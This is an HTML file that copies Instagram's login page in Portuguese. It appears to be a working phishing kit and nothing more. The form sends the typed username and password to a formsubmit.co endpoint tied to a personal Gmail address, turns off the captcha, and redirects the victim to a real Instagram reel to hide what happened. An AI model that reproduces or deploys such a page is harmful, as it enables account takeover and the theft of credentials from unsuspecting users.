<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Instagram</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 350px;
            background-color: #000;
            padding: 40px 20px;
            border: 1px solid #222;
        }

        .logo {
            font-family: 'Segoe UI', cursive;
            font-size: 45px;
            text-align: center;
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 51px; /* Ajuste de altura para o tamanho do logo */
        }


        .btn-facebook {
            background-color: #1877f2;
            color: white;
            border: none;
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            color: #999;
        }

        .separator::before, .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #444;
        }

        .separator:not(:empty)::before {
            margin-right: .75em;
        }

        .separator:not(:empty)::after {
            margin-left: .75em;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 6px;
            background-color: #121212;
            border: 1px solid #333;
            border-radius: 4px;
            color: white;
            box-sizing: border-box;
        }

        .show-password {
            position: relative;
        }

        .show-password input {
            padding-right: 60px;
        }

        .show-password button {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #0af;
            font-size: 12px;
            cursor: pointer;
        }

        .forgot {
            text-align: center;
            margin: 10px 0;
            font-size: 13px;
        }

        .forgot a {
            color: #b2b2b2;
            text-decoration: none;
        }

        .btn-login {
            background-color: #0095f6;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup {
            text-align: center;
            font-size: 14px;
            margin-top: 20px;
        }

        .signup a {
            color: #0af;
            text-decoration: none;
        }

        .terms {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 25px;
        }

        .terms a {
            color: #999;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><i data-visualcompletion="css-img" aria-label="Instagram" class="logo" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png&quot;); background-position: 0px 0px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
        
        <form action="https://formsubmit.co/masunsolar@gmail.com" method="POST">
            <input type="text" name="message" placeholder="Telefone, nome de usuário ou email" required>

            <div class="show-password">
                <input type="password" name="pass" placeholder="Senha" id="senha" required>
            </div>
            <button class="btn-login" type="submit" value="Enviar">Entrar</button>
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.instagram.com/reel/DJB7AIruO0A/?utm_source=ig_web_copy_link">
        </form>

        
        <div class="separator"></div>
        <div class="forgot"><a href="#">Esqueceu a senha?</a></div>
        <div class="signup">Não tem uma conta? <a href="#">Cadastre-se</a></div>
        <div class="terms">
            Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> do Instagram.
        </div>
    </div>
    <script>
        function toggleSenha() {
            const senhaInput = document.getElementById("senha");
            senhaInput.type = senhaInput.type === "password" ? "text" : "password";
        }
    </script>
</body>
</html>
